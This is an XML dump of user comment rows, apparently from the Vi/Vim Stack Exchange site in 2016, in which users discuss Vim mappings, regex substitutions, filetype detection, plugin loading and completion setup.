  <row Id="12370" PostId="7532" Score="0" Text="Anyhow, the versions you provided work only for multiline comments outside any blocks. They aren't aligning multiline comments inside a block. Solution must be universal for any perl script." CreationDate="2016-04-28T10:37:50.473" UserId="7161" />
  <row Id="12371" PostId="7532" Score="1" Text="Vim doesn't align them because POD blocks can't be aligned: `=` should be right at the start of the line. `perlpod` doesn't say so quite as explicitly, stating that &quot;All command paragraphs […] start with `=`&quot; instead, but [this thread](http://www.perlmonks.org/?node_id=560924) at PerlMonks discusses the limitation (search for &quot;indent&quot;, there's a few subthreads about it.)" CreationDate="2016-04-28T10:53:50.857" UserId="7415" />
  <row Id="12374" PostId="7516" Score="0" Text="@KarlYngveLervåg Sorry, I meant to say &quot;no functional difference&quot; in regard to jumping to column 1 if already at `^`. I believe my solution is better because I thought the desired effect wasn't just jumping, but having only one key to press. The current script toggles between both positions, like the OP's script does. If you actually want to go to col 1 when to the left of `^`, you would want: `col('.') &lt;= indent('.')+1` and with the toggle: `col('.') != 1 &amp;&amp; col('.') &lt;= indent('.')+1`" CreationDate="2016-04-28T14:13:31.327" UserId="5229" />
  <row Id="12375" PostId="7482" Score="1" Text="Very nice. I found adding `g` at the beginning helps if there are more than one set of delimiters." CreationDate="2016-04-28T14:46:28.613" UserId="4505" />
  <row Id="12376" PostId="7535" Score="0" Text="Ctrl+x , Ctrl+f completes filenames as well as directories. So, you can map them to tab in normal mode." CreationDate="2016-04-28T15:28:45.917" UserId="7161" />
  <row Id="12377" PostId="7535" Score="2" Text="@SibiCoder: yes but not in this case. CTRL-F open the command line window if executed from the command line `:h c_CTRL-F`" CreationDate="2016-04-28T15:34:12.017" UserId="1821" />
  <row Id="12379" PostId="7537" Score="0" Text="Yep, that works great.  What's the difference between E and $ in this case" CreationDate="2016-04-28T16:32:21.137" UserId="1532" />
  <row Id="12380" PostId="7537" Score="1" Text="`E` goes to the end of a `WORD`, `$` goes to the end of the line. See: `:help E`" CreationDate="2016-04-28T16:37:45.687" UserId="6489" />
  <row Id="12381" PostId="7509" Score="0" Text="This is a great solution, but it single quotes the resulting strings. This is fine for my application, but do you know if there's a way to change the default of &quot;string&quot; to double quote strings? Otherwise another pass to search and replace quotes is necessary" CreationDate="2016-04-28T17:23:15.073" UserId="7405" />
  <row Id="12382" PostId="7540" Score="0" Text="Cool. Yeah, I think this will work. Thanks! Ok, I understand all of this except one thing: Could you tell me what `&lt;C-U&gt;` does in this context? I assume it's not the scrolling function that I find in `:help CTRL-U`." CreationDate="2016-04-28T18:04:27.830" UserId="6489" />
  <row Id="12383" PostId="7540" Score="1" Text="@Tumbler41 `&lt;C-U&gt;` deletes from the cursor up to the beginning of the line. Without it, whenever you would hit `&lt;Up&gt;`, the mapping would add a new entry from the input history on the command-line without clearing it first. So `&lt;C-U&gt;` makes sure the command-line is always cleared before inserting something. You can get this information here: `:h c_ctrl-u`" CreationDate="2016-04-28T18:08:42.850" UserId="6960" />
  <row Id="12384" PostId="108" Score="0" Text="@Jasper `Y` and `yy` are synonymous...per `:h Y`" CreationDate="2016-04-28T19:09:11.867" UserId="895" />
  <row Id="12385" PostId="7509" Score="1" Text="No, the single quotes can't be changed to double quotes. But, as I said, *&quot;just for the fun of it&quot;*." CreationDate="2016-04-28T19:15:06.070" UserId="54" />
  <row Id="12386" PostId="6660" Score="0" Text="@ChristianBrabandt, it's never too late, right? This was a great answer. I didn't know that this existed." CreationDate="2016-04-28T21:07:33.627" UserId="2062" />
  <row Id="12387" PostId="7511" Score="0" Text="Are you saying that I need to have a structure /.vim/bundle/autoclose/plugin/autoclose.vim, instead of /.vim/bundle/autoclose/autoclose.vim?" CreationDate="2016-04-28T22:46:12.200" UserId="7399" />
  <row Id="12388" PostId="7511" Score="0" Text="Nevermind this fixed it. Thanks!" CreationDate="2016-04-28T22:47:38.973" UserId="7399" />
  <row Id="12389" PostId="7462" Score="0" Text="Please mark your answer as accepted since it worked for you." CreationDate="2016-04-28T23:16:30.327" UserId="7415" />
  <row Id="12390" PostId="389" Score="0" Text="Can you hide all of that so you can see your code a few lines down?" CreationDate="2016-04-29T02:18:28.393" UserId="7441" />
  <row Id="12391" PostId="7542" Score="0" Text="How about setting file encoding to utf8?" CreationDate="2016-04-29T05:52:40.367" UserId="7161" />
  <row Id="12392" PostId="7542" Score="1" Text="What does the following do in your terminal: `echo 1 | tr 1 ۱` ?" CreationDate="2016-04-29T06:30:54.710" UserId="1821" />
  <row Id="12393" PostId="7543" Score="1" Text="What do you mean &quot;cannot be recognized by the program that's supposed to process the text file&quot; and &quot;this part doesn't seem to be executed&quot;? Recognized how, executed how?" CreationDate="2016-04-29T06:34:07.790" UserId="1821" />
  <row Id="12395" PostId="7543" Score="0" Text="No, I don't get any errors. The program does not complain, bash doesn't complain either. Those contents are simply ignored. I try to use :set list to check if there's any special character but I couldn't see any difference." CreationDate="2016-04-29T06:43:44.550" UserId="7444" />
  <row Id="12396" PostId="7543" Score="0" Text="For what it's worth, try pasting after setting `:set paste`, I had issues with pasting in the past that I solved with this." CreationDate="2016-04-29T06:49:40.220" UserId="1821" />
  <row Id="12397" PostId="7543" Score="0" Text="@Nobe4 , thanks for the suggestion. I'll definitely use :set paste in the future. I'm still wondering what actually caused these problems, though.." CreationDate="2016-04-29T06:51:34.167" UserId="7444" />
  <row Id="12398" PostId="389" Score="0" Text="@MatthewCliatt, hide what? The popup menu? There's nothing special in the code. It's just `return 0` underneath that popup menu." CreationDate="2016-04-29T07:28:31.890" UserId="246" />
  <row Id="12399" PostId="7543" Score="1" Text="If you try with some vimscript, i.e. `echomsg 'a'` and for running `:so %` (considering your script is in the current file) ? (with manual typing and copy/pasting)" CreationDate="2016-04-29T07:44:03.607" UserId="1821" />
  <row Id="12400" PostId="7543" Score="0" Text="@Nobe4: I can get the output correctly with manual typing. While I use Ctrl+C to copy the text from Google Doc, this is what I get : line 1: E15: Invalid expression: 'a'  E15: Invalid expression: 'a' . When I right click copy from firefox, it's fine. If I paste the content Ctrl+C copied from Google Doc with &quot;*p command, then it works fine." CreationDate="2016-04-29T08:01:14.993" UserId="7444" />
  <row Id="12401" PostId="7543" Score="3" Text="Interesting ... Can you paste it, save the file and the do a `xxd` on the file, to see if there are differences ?" CreationDate="2016-04-29T08:05:50.683" UserId="1821" />
  <row Id="12402" PostId="7543" Score="0" Text="@Nobe4 With `&quot;*p` command, this is the output of `xxd` : 0000000: 6563 686f 6d73 6720 2761 270a            echomsg 'a'.  . With right-click paste, the output is 0000000: 6563 686f 6d73 6720 e280 9861 e280 990a  echomsg ...a...." CreationDate="2016-04-29T08:11:36.627" UserId="7444" />
  <row Id="12403" PostId="7543" Score="0" Text="Let us [continue this discussion in chat](http://chat.stackexchange.com/rooms/39054/discussion-between-nobe4-and-user3667217)." CreationDate="2016-04-29T08:12:46.487" UserId="1821" />
  <row Id="12404" PostId="7378" Score="0" Text="@statox People learn different ways. It makes no sense to say &quot;it is better to learn...once at the time&quot;; rather &quot;I personally find it better to learn...&quot;.    Also, you might pick up ideas for what you can do more efficiently using hardmode that you'd not have considered.  When I was learning vim I put the mouse upside down, or moved it out of reach, and mapped the cursor keys to do nothing etc.  It's possible to imagine someone learning vim and it never dawning on them that using the mouse or cursor keys is inefficient if that's what you've done for 30 years." CreationDate="2016-04-29T10:35:19.740" UserId="859" />
  <row Id="12405" PostId="7542" Score="0" Text="@SibiCoder I have `set encoding=utf-8` setting in my `~/.vimrc`." CreationDate="2016-04-29T12:14:01.200" UserId="7357" />
  <row Id="12406" PostId="7542" Score="0" Text="@Nobe4 It works correctly in my terminal. The output is `۱`." CreationDate="2016-04-29T12:15:25.583" UserId="7357" />
  <row Id="12407" PostId="7542" Score="1" Text="have a look at http://vimdoc.sourceforge.net/htmldoc/farsi.html#Farsi, the part `Setting the Farsi fonts`. Does it help ?" CreationDate="2016-04-29T12:21:35.500" UserId="1821" />
  <row Id="12408" PostId="7378" Score="1" Text="@Alex Indeed my comment was only my personal opinion, I would never consider that I have the only and universal solution that's why my the last sentence was `That being said it is only my opinion: one has right to disagree`. Now, the debate is potentially endless: of course some people will benefit of this kind of plugin whereas it will only frustrate some other and harm their learning. If you'd like to talk about it I'll gladly discuss with you in a chat but we shouldn't spam the comments of the question with this kind of debate :-)" CreationDate="2016-04-29T12:45:26.810" UserId="1841" />
  <row Id="12409" PostId="7545" Score="2" Text="Like you said, this question is about Vim rather than Emacs, and isn't on-topic for this site." CreationDate="2016-04-29T15:23:56.327" UserDisplayName="Ryan" />
  <row Id="12410" PostId="7549" Score="3" Text="I understand your point, but you should really have a look at marks. They are literally bookmarks for your files. Give a try at it! You'll learn and you can use them in your day-to-day editions." CreationDate="2016-04-29T19:52:49.777" UserId="1821" />
  <row Id="12411" PostId="7550" Score="2" Text="How about creating a function that create both mapping, and wrap them with `has('mac')`?" CreationDate="2016-04-29T20:39:52.457" UserId="1821" />
  <row Id="12412" PostId="7550" Score="0" Text="Probably a good idea, but I don't know vimscript that well right now. For example such function should take a keys that one should press after alt/cmd (or with it) and and action. I have no idea how to pass this to a function in vim." CreationDate="2016-04-29T20:49:21.967" UserId="6634" />
  <row Id="12413" PostId="7550" Score="0" Text="Have a look at: http://learnvimscriptthehardway.stevelosh.com/" CreationDate="2016-04-29T20:50:17.653" UserId="1821" />
  <row Id="12414" PostId="7549" Score="2" Text="The cursor is always somewhere on the screen. That's how Vim is designed and there's no way around that." CreationDate="2016-04-29T21:04:49.850" UserId="54" />
  <row Id="12417" PostId="7553" Score="1" Text="It looks a real good answer; I will look at it a bit before accepting it" CreationDate="2016-04-30T01:46:45.460" UserId="5516" />
  <row Id="12418" PostId="7546" Score="0" Text="Duplicate of: http://vi.stackexchange.com/q/40/5010." CreationDate="2016-04-30T09:39:44.807" UserId="5010" />
  <row Id="12419" PostId="7557" Score="3" Text="Nice +1! To get the output desired by @Banavara, in the replacement part, maybe you could invert the order of the newline and the backreference to the whole pattern `&amp;`:  `:map q :%s/Name. /&amp;\^V^V^M/g^M`" CreationDate="2016-04-30T09:49:58.930" UserId="6960" />
  <row Id="12420" PostId="7556" Score="0" Text="1. Vi doesn't have a `:map` command so you are not using it. 2. `q` is a very useful operator, you should probably reconsider mapping it." CreationDate="2016-04-30T09:52:41.173" UserId="54" />
  <row Id="12421" PostId="7556" Score="3" Text="@romainl yes, it does. See the part I quoted from http://ex-vi.sourceforge.net/viin/paper-6.html#section42." CreationDate="2016-04-30T09:57:45.063" UserId="205" />
  <row Id="12422" PostId="7556" Score="0" Text="Wow… thanks @muru." CreationDate="2016-04-30T10:42:13.857" UserId="54" />
  <row Id="12423" PostId="7545" Score="0" Text="You'll have to be a bit more specific about the behaviour you want. If you just want to map `:` to space, then: `nnoremap : &lt;space&gt;` is sufficient." CreationDate="2016-04-30T11:06:07.303" UserId="205" />
  <row Id="12424" PostId="7557" Score="1" Text="WOW...! Fantastic muru. I had to read 2/3 times to understand that. It works like charm. for the last part, * operator matching none or more occurance can be used as `:map q :%s/Name. */\^V^V^M&amp;/g^M` (but it still inserts a newline at the top. I have another question regarding this, will post it as a different question. (The answer was so good, I created an account to comment! Thank you muru)" CreationDate="2016-04-30T11:43:25.753" UserId="7457" />
  <row Id="12425" PostId="7557" Score="0" Text="@Banavara thanks. But see user9433424's comment above, I'd say that's correct." CreationDate="2016-04-30T11:46:36.457" UserId="205" />
  <row Id="12426" PostId="7545" Score="1" Text="He actually wants *all* the vim-like combinations defined by Spacemacs (i.e. starting with the `Space` leader key) to be brought back to Vim ... of course, mapping stuff is so easy in Vim, the sensible suggestion would be for the OP to create his own maps, as need arises (open `vimrc`, add the map, re-source the file, close). Because I wonder what Vim person has that inclination of reading all those Spacemacs config layers, extract the modal parts, and import them back to a Vim plugin ... although, who knows, some people today would do anything for fame :P" CreationDate="2016-04-30T11:47:33.650" UserId="1800" />
  <row Id="12427" PostId="7559" Score="1" Text="If it is just searching, include a character before the target pattern: `/.Name.`" CreationDate="2016-04-30T12:05:21.077" UserId="205" />
  <row Id="12428" PostId="7557" Score="0" Text="Thank you @user9433424, your solution works just as I specified. The reason for inserting newline before Name is that there are some other details after Name field and I wanted all records to be broken Name field, so that all details are on their own line." CreationDate="2016-04-30T12:05:22.760" UserId="7457" />
  <row Id="12429" PostId="7559" Score="0" Text="unfortunately this is for search and replace :(" CreationDate="2016-04-30T12:09:21.767" UserId="7457" />
  <row Id="12430" PostId="7559" Score="4" Text="Then you can probably use groups: `s/\(.\)Name./\1replacement/`. So that you match the character and retain it in the replacement." CreationDate="2016-04-30T12:10:44.313" UserId="205" />
  <row Id="12431" PostId="7091" Score="0" Text="@Carpetsmoker, why not move that comment into an answer? ;)" CreationDate="2016-04-30T12:14:07.667" UserId="7415" />
  <row Id="12432" PostId="7542" Score="0" Text="@Nobe4 Unfortunately I can not find the way to install console fonts is OS X. In addition to this, with previous versions of vim I had no misbehaviors like this." CreationDate="2016-04-30T12:16:17.967" UserId="7357" />
  <row Id="12433" PostId="7133" Score="0" Text="Okay so everybody loves this question...how about an answer?!?!?" CreationDate="2016-04-30T12:47:09.010" UserId="1065" />
  <row Id="12434" PostId="7559" Score="0" Text="This works perfectly for me. Thank you muru." CreationDate="2016-04-30T12:55:08.187" UserId="7457" />
  <row Id="12435" PostId="7482" Score="0" Text="I wonder whether something similar could be used to make a visual selection?" CreationDate="2016-04-30T13:39:50.677" UserId="4505" />
  <row Id="12436" PostId="7482" Score="0" Text="Interesting, you should be able by modifying the marks `&lt;` and `&gt;`, I think it's worth another question ;)" CreationDate="2016-04-30T13:53:11.160" UserId="1821" />
  <row Id="12437" PostId="7560" Score="1" Text="I'm pretty sure the original `vi` doesn't support lookarounds." CreationDate="2016-04-30T15:56:40.553" UserId="205" />
  <row Id="12438" PostId="7562" Score="7" Text="Sure there is: `:%g/^\d\{4}\d\@!/s/^\(\d\{4}\).*\zs/ \1/`." CreationDate="2016-05-01T08:06:26.063" UserId="2313" />
  <row Id="12439" PostId="7564" Score="2" Text="You can also execute it on every line with `:%normal @q`" CreationDate="2016-05-01T09:03:39.697" UserId="514" />
  <row Id="12440" PostId="7564" Score="0" Text="@evilsoup: Thanks for mentioning that, I'll edit the answer." CreationDate="2016-05-01T09:19:33.767" UserId="1841" />
  <row Id="12442" PostId="7581" Score="2" Text="Maybe you could test the existence of the functions before calling them. For example something like: `if exists(*submode#enter_with)`." CreationDate="2016-05-01T12:19:27.417" UserId="6960" />
  <row Id="12443" PostId="7581" Score="0" Text="Sorry I forgot the single quotes: `if exists('*submode#enter_with')`" CreationDate="2016-05-01T12:25:19.807" UserId="6960" />
  <row Id="12444" PostId="7581" Score="0" Text="@user9433424: I don't really understand why but `exists('*submode#enter_with')` always returns false (no matter if the plugin is installed or not) in my vimrc." CreationDate="2016-05-01T12:32:32.847" UserId="1841" />
  <row Id="12445" PostId="7582" Score="2" Text="What is a &quot;numbered jump&quot;?" CreationDate="2016-05-01T12:34:15.710" UserId="54" />
  <row Id="12446" PostId="7581" Score="1" Text="Maybe that's because your plugin uses autoloading: http://learnvimscriptthehardway.stevelosh.com/chapters/53.html If that's the case, the function is only defined when you call it for the first time, and my answer was not really useful for your particular case, sorry." CreationDate="2016-05-01T12:44:41.847" UserId="6960" />
  <row Id="12447" PostId="7582" Score="4" Text="http://stackoverflow.com/questions/29746445/is-there-a-vim-command-to-undo-the-last-motion-e-g-countj-or-ctrl-f/29746735#29746735" CreationDate="2016-05-01T12:46:58.830" UserId="1800" />
  <row Id="12448" PostId="7581" Score="0" Text="Yes I think autoloading is the reason. And no need to be sorry you tried to help it's all that matter :)" CreationDate="2016-05-01T13:50:33.540" UserId="1841" />
  <row Id="12449" PostId="7583" Score="1" Text="Not unless you change Vim's source code." CreationDate="2016-05-01T14:22:03.827" UserId="54" />
  <row Id="12451" PostId="7581" Score="2" Text="I think checking if plugin's path exists is your best bet. This seems to be the case also with `vim-plug` plugin manager - see for example https://github.com/junegunn/vim-plug/blob/master/plug.vim#L2003. (BTW using it could simplify things for you, I think you just have to add a 'PlugInstall' or similar command to your `vimrc` end)." CreationDate="2016-05-01T15:06:02.570" UserId="1800" />
  <row Id="12452" PostId="7563" Score="2" Text="`:%s/\v^(\d{4}).*/&amp; \1/` would be a shorter command." CreationDate="2016-05-01T15:21:08.283" UserId="6698" />
  <row Id="12453" PostId="7585" Score="1" Text="From [this answer](http://stackoverflow.com/a/31282559/1121933): *Be sure to use the [canonical URL](https://help.github.com/articles/getting-permanent-links-to-files/). You can get it for a particular commit by pressing the `y` key. The URL in your browser will change accordingly.*" CreationDate="2016-05-01T15:49:29.950" UserId="6698" />
  <row Id="12454" PostId="7585" Score="0" Text="@JairLopez Cool, I didn't know about that feature on github.  I updated the URLs in my answer." CreationDate="2016-05-01T16:30:57.363" UserId="7468" />
  <row Id="12455" PostId="7566" Score="0" Text="Not really vi/vim, then, or the first four characters." CreationDate="2016-05-01T18:04:09.097" UserId="6389" />
  <row Id="12456" PostId="7566" Score="1" Text="Considering `:help filter` is a built-in Vim feature and considering how well that feature allows Vim to fit in the UNIX paradigm I would say it's very vi/vim, actually." CreationDate="2016-05-01T18:29:10.970" UserId="54" />
  <row Id="12457" PostId="7586" Score="1" Text="Sounds like an [XY problem](http://meta.stackexchange.com/a/66378/138251).  What are you actually trying to achieve?" CreationDate="2016-05-02T01:55:49.903" UserId="15" />
  <row Id="12458" PostId="7589" Score="0" Text="I tried first two remaps on my linux machine, it still yanks to current register..  check out: http://stackoverflow.com/questions/54255/in-vim-is-there-a-way-to-delete-without-putting-text-in-the-register and in general you might want to learn about using vim registers: http://stackoverflow.com/questions/1497958/how-do-i-use-vim-registers" CreationDate="2016-05-02T04:52:40.453" UserId="1616" />
  <row Id="12459" PostId="7589" Score="0" Text="well if I do &quot;xdd in my editor it yanks to the black hole" CreationDate="2016-05-02T05:03:38.493" UserId="7053" />
  <row Id="12460" PostId="7589" Score="2" Text="can you check by using `_` instead of `x` in all three remaps? may be something else is the issue here" CreationDate="2016-05-02T05:06:25.130" UserId="1616" />
  <row Id="12461" PostId="7590" Score="0" Text="See `:help ins-completion` and `:help 'complete'`." CreationDate="2016-05-02T05:11:14.790" UserId="54" />
  <row Id="12462" PostId="7591" Score="3" Text="Addendum: If this is something you *really* want to do, I think you should be using `onoremap` for some of those mappings such as `d`." CreationDate="2016-05-02T05:14:08.253" UserId="5229" />
  <row Id="12463" PostId="7590" Score="0" Text="@romainl helpful to an extent. I guess I could use &quot;dictionary&quot; completion, but that would be dropping out of YCM, into normal vim completion stuff, unless I can set YCM to dictionary mode.&#xA;I assume that is why you are commenting not answering." CreationDate="2016-05-02T05:16:21.170" UserId="360" />
  <row Id="12464" PostId="7590" Score="1" Text="Relevant: https://github.com/Valloric/YouCompleteMe/issues/138" CreationDate="2016-05-02T05:22:44.017" UserId="360" />
  <row Id="12465" PostId="7590" Score="0" Text="I'm commenting because YCM has documentation and an issue tracker. That's where you are supposed to look for answers, not here." CreationDate="2016-05-02T06:07:25.313" UserId="54" />
  <row Id="12466" PostId="7590" Score="1" Text="@romainl that doesn't seem inline with your first comment -- which was a lookup to *vim's* documentation. YCM's documentation is not particularly excellent -- not compared to asking someone with experience, thus Stack Exchange sites.&#xA;Most plugins have documentation and an issue tracker, yet we have 22 other questions on YCM.&#xA;And 19 on NerdTree,  18 on Utilisnips, 17 on Airline, 15 on vim-latex etc.&#xA;I'm not seeing what you are getting at?&#xA;&#xA;Vim itself has documentation and an issue tracker, perhaps we should not use this Stack Exchange site at all?&#xA;http://meta.vi.stackexchange.com/questions/21/" CreationDate="2016-05-02T06:16:37.293" UserId="360" />
  <row Id="12467" PostId="7593" Score="2" Text="This is not very clear to me. Can you add an example before/after?" CreationDate="2016-05-02T07:50:18.140" UserId="205" />
  <row Id="12468" PostId="7590" Score="0" Text="1. YCM is too bloated, too hard to install and too hard to configure with regard to its supposed benefit. 2. Its small user base and the opacity of its code base make it hard to support that thing. 3. I comment the same thing every time a `$BIG_PLUGIN` question pops up. 3. YCM supposedly defaults to keyword completion when no omni-completion is found. That's why I pointed to the built-in methods." CreationDate="2016-05-02T08:10:53.560" UserId="54" />
  <row Id="12470" PostId="7593" Score="0" Text="I tried this :iabbr &lt;ESC&gt;&lt;CR&gt;P. This works when I have the multiline rectangular text in the recent copy register. But I will need to paste these kind of text in any file, by storing them in iabbr or a function similar to this." CreationDate="2016-05-02T08:15:50.840" UserId="7161" />
  <row Id="12471" PostId="7586" Score="0" Text="@jamessan I'm trying to resolve https://github.com/vim/vim/issues/776 (I'm reporter of that issue). I got to `matchparen.vim` using `CursorMoved`, `CursorMovedI`, `WinEnter`, `TextChanged` and `TextChangedI` for doing it's job. A simple fix would be adding something like `WindowScrolled` there. But it seems that it doesn't exist. But ofc it's possible that this is XY problem. Any idea how to do this in some different way?" CreationDate="2016-05-02T08:21:28.200" UserId="5397" />
  <row Id="12472" PostId="7593" Score="2" Text="@SibiCoder: I have read a lot of your questions lately and they all are pretty hard to understand (they are all edited by other users). I do understand that english isn't your primary language (it is not mine either and I don't pretend that I never make unclear sentences) but please try to make your questions more clear. Make short sentences, try to be more precise about what you're talking about, include example of commands you are using. It will really help us to help you. I hope that you understand that this comment is respectul and friendly: my only goal is to have more clear questions :-)" CreationDate="2016-05-02T09:39:27.390" UserId="1841" />
  <row Id="12473" PostId="7592" Score="0" Text="It is however interesting that with the %-key Vim does correctly jump to the matching bracket. I also note that I had to encapsulate the mathmode label in curly braces. Hence, if these curly braces would be acknowlegded by Vim's syntax as something special might be a solution. If you can elaborate on this thought, please do." CreationDate="2016-05-02T09:42:17.413" UserId="7472" />
  <row Id="12474" PostId="7581" Score="0" Text="@VanLaser: Thanks for your link. I'm a little bit disappointed there isn't a &quot;cleaner&quot; way to test that. I'll probably make my own function inspired on vim-plug." CreationDate="2016-05-02T09:44:21.220" UserId="1841" />
  <row Id="12475" PostId="7590" Score="2" Text="I think using syntax highlighting keywords and dictionaries are the way to do this for now. That's how I use YCM in minor filetypes (like logrotate or Upstart configuration files)." CreationDate="2016-05-02T10:50:03.873" UserId="205" />
  <row Id="12476" PostId="7598" Score="1" Text="I'm guessing from the log that this is a minimal setup? Oddly, in my case, the file in `pack/*/start/*/ftplugin` was loaded before the one in `/usr/share/vim/vim74/ftplugin`. Which version of Vim?" CreationDate="2016-05-02T11:09:00.187" UserId="205" />
  <row Id="12477" PostId="7593" Score="0" Text="@statox: Is it clear now" CreationDate="2016-05-02T11:28:06.813" UserId="7161" />
  <row Id="12478" PostId="7581" Score="0" Text="@statox - You're welcome. I wonder, couldn't one use `try` and `catch` Vim keywords when calling `submode#enter_with`? (at the 1st call, perhaps)." CreationDate="2016-05-02T11:42:01.867" UserId="1800" />
  <row Id="12479" PostId="7581" Score="0" Text="@VanLaser: Damn! How did I not think of it earlier whereas I already use it somewhere else in my `.vimrc`! Of course `try` and `catch`are perfect for that. I just solved my problem with them. You can post that as an answer if you want: it is not dependent of the installation path nor of the plugin manager used, I don't need to write a new function and if I want to do nothing when an error pops, the `catch` clause can be empty." CreationDate="2016-05-02T12:05:10.973" UserId="1841" />
  <row Id="12480" PostId="7581" Score="1" Text="@statox - cool then! I don't use `try` and `catch` myself; from my part is perfect if you post your solved problem (or relevant lines) as answer :)" CreationDate="2016-05-02T12:16:59.743" UserId="1800" />
  <row Id="12481" PostId="7593" Score="2" Text="@SibiCoder: Thank you, indeed it is clear now: I retracted my close vote. Now on my system if I select the box to past with visual-block (`ctrl-v` instead of `v`), put my cursor on the last character of the first line of the first box and paste with `p`, the second box is pasted next to the other one... Do you use visual-block to select the box?" CreationDate="2016-05-02T12:49:49.420" UserId="1841" />
  <row Id="12482" PostId="7599" Score="2" Text="What's missing is a way for Vim to recognize the &quot;data&quot; filetype. You will have to add something like: `au BufNewFile,BufRead *.data set filetype=data`. See also [this link](http://learnvimscriptthehardway.stevelosh.com/chapters/44.html)" CreationDate="2016-05-02T13:00:09.430" UserId="1800" />
  <row Id="12483" PostId="7601" Score="1" Text="I thought about this, but there may be an edge case when you define a special filetype for a file extension, i.e. with an autocommand `autocmd! bufreadpost *.gs set filetype=javascript` Here the extension is `gs` but the filetype is `javascript`" CreationDate="2016-05-02T13:03:40.577" UserId="1821" />
  <row Id="12484" PostId="7599" Score="1" Text="Run `:set filetype`. That will tell you what Vim thinks is the filetype." CreationDate="2016-05-02T13:03:47.930" UserId="205" />
  <row Id="12485" PostId="7601" Score="1" Text="//will exist only in this buffer // what does this mean? I thought this abbreviation will work in any buffer. Does this bufenter trigger every time when a file of this type is edited?" CreationDate="2016-05-02T13:04:24.557" UserId="7161" />
  <row Id="12486" PostId="7603" Score="2" Text="Have you tried replacing `|` with `&lt;bar&gt;`?" CreationDate="2016-05-02T13:05:27.700" UserId="1841" />
  <row Id="12487" PostId="7601" Score="2" Text="@SibiCoder yes. This way, a buffer for a `.sh` file, for example, wouldn't have this abbreviation. Keeps your abbreviations and maps clean." CreationDate="2016-05-02T13:06:42.040" UserId="205" />
  <row Id="12488" PostId="7603" Score="2" Text="That, or escape the pipe character, otherwise Vim believes you want to have 3 commands on a single line - try `\|`" CreationDate="2016-05-02T13:06:43.213" UserId="1800" />
  <row Id="12489" PostId="7603" Score="2" Text="The second pipe between `0read` and the bang should also be removed." CreationDate="2016-05-02T13:07:41.797" UserId="6960" />
  <row Id="12492" PostId="7601" Score="0" Text="@SibiCoder: muru is right, see the edit of my answer for a more detailed explanation." CreationDate="2016-05-02T13:21:20.983" UserId="1841" />
  <row Id="12493" PostId="7604" Score="2" Text="The only &quot;issue&quot; of this answer is exactly the fact that Vim may not know anything about i.e. the `*.data` extension of a file, so the `filetype` may be not set up correctly, or at all." CreationDate="2016-05-02T13:42:56.133" UserId="1800" />
  <row Id="12494" PostId="7604" Score="3" Text="Right, in which case, statox's answer is better :)" CreationDate="2016-05-02T13:43:56.047" UserId="1821" />
  <row Id="12496" PostId="7560" Score="0" Text="Oh, fair enough. I'm not as familiar with original vi, but I thought that all the regex still worked. Good to know that it doesn't all carry over." CreationDate="2016-05-02T14:53:34.643" UserId="6489" />
  <row Id="12497" PostId="7598" Score="0" Text="@muru I give an update. I use Vim version 7.4.1797, huge version without GUI on OSX." CreationDate="2016-05-02T15:02:16.103" UserId="911" />
  <row Id="12498" PostId="7560" Score="0" Text="You can check the help. For example, [`:h /\@&lt;!`](http://vimhelp.appspot.com/pattern.txt.html#%2F%5C%40%3C%21) - they will be marked `{not in Vi}`." CreationDate="2016-05-02T15:10:12.567" UserId="205" />
  <row Id="12500" PostId="7607" Score="0" Text="Thanks a lot for the explanation and especially for the function. Btw I have set the buffers to ask whether to save or not on close by default. How to change this behaviour for this specific split?" CreationDate="2016-05-02T16:37:06.760" UserId="7479" />
  <row Id="12503" PostId="7603" Score="0" Text="@user9433424 that was the issue, thanks." CreationDate="2016-05-02T16:48:18.240" UserId="7479" />
  <row Id="12504" PostId="7607" Score="2" Text="@meain In your temporary split, you could set the local-buffer value of the `buftype` option to `nofile`. It could give something like: `nnoremap ,s :new \| setlocal buftype=nofile \| 0r!` Or you could add `setlocal buftype=nofile` inside the `SplitRunCommand()` function, just after the `new` command." CreationDate="2016-05-02T16:54:59.903" UserId="6960" />
  <row Id="12505" PostId="7607" Score="2" Text="@meain in addition to what user9433424 says, also see [`:h special-buffers`](http://vimhelp.appspot.com/windows.txt.html#special-buffers) (in particular the scratch buffer)" CreationDate="2016-05-02T17:10:08.580" UserId="205" />
  <row Id="12506" PostId="7362" Score="0" Text="Yeah that works. You need to call expand('&lt;sfile&gt;') to get what needs to be removed from the end of expand('&lt;sfile&gt;:p) and then take that string with the correct part removed and add the s:filename to the end of it. I believe there is a better way of doing this, but this does work. Thanks!" CreationDate="2016-05-02T17:47:00.643" UserId="1410" />
  <row Id="12507" PostId="7608" Score="8" Text="Not sure why you would need this. If you want to use it in a script you can just use `e filename` in the script. If you really need it for some reason you can write it a custom function that takes an argument called file and then calls `e a:file`." CreationDate="2016-05-02T18:00:36.847" UserId="6489" />
  <row Id="12508" PostId="7362" Score="0" Text="I'm glad it worked for you. I'm really not sure a better solution exists but if you find one please post an answer it would certainly benefits to other users." CreationDate="2016-05-02T18:16:47.227" UserId="1841" />
  <row Id="12509" PostId="7592" Score="0" Text="Yes, but the `%` key is easier; it relies on the `searchpair` functions, which allows to find nested pairs of delimiters. This functionality is not available for syntax pattern matching (as far as I know). Note: I do not claim that it is impossible to solve this, I only say that it is difficult, and that I, for instance, don't want to spend time trying to solve it, since the gain is not that high compared to the (expected) amount of work." CreationDate="2016-05-02T18:47:42.103" UserId="21" />
  <row Id="12510" PostId="7608" Score="2" Text="I agree with @Tumbler41: it looks like a typical [XY problem](http://meta.stackexchange.com/q/66377/288754). You should give more details about what you want to do in the first place." CreationDate="2016-05-02T18:56:37.883" UserId="1841" />
  <row Id="12511" PostId="7590" Score="0" Text="@muru do you think you could put an example online somewhere? Either as an answer, or as a dump of files that I could investigate until I understood, and then I could self-answer this." CreationDate="2016-05-03T00:34:45.830" UserId="360" />
  <row Id="12512" PostId="2755" Score="0" Text="This does not work as expected (no, not even solution 1).  I believe you missed that this is to be executed on a visual block, *not* in visual line mode." CreationDate="2016-05-03T03:24:23.920" UserId="4676" />
  <row Id="12513" PostId="7599" Score="1" Text="@muru : I gave that command and found the type to be conf. When I give :au FileType conf set command, it works. :)" CreationDate="2016-05-03T06:42:52.730" UserId="7161" />
  <row Id="12514" PostId="7590" Score="0" Text="Here's an example for LaTeX: https://gist.github.com/murukeshm/16011036e486a35e0d93d1f83ef38150 this is my evolution of http://vi.stackexchange.com/a/2360/205. It uses supertab for `omnifunc`, and then, with semantic completion, I get the fuzzy matching of YCM when I start typing a `​\​`. It shows two ways: with tags, and with a syntax file." CreationDate="2016-05-03T09:19:15.300" UserId="205" />
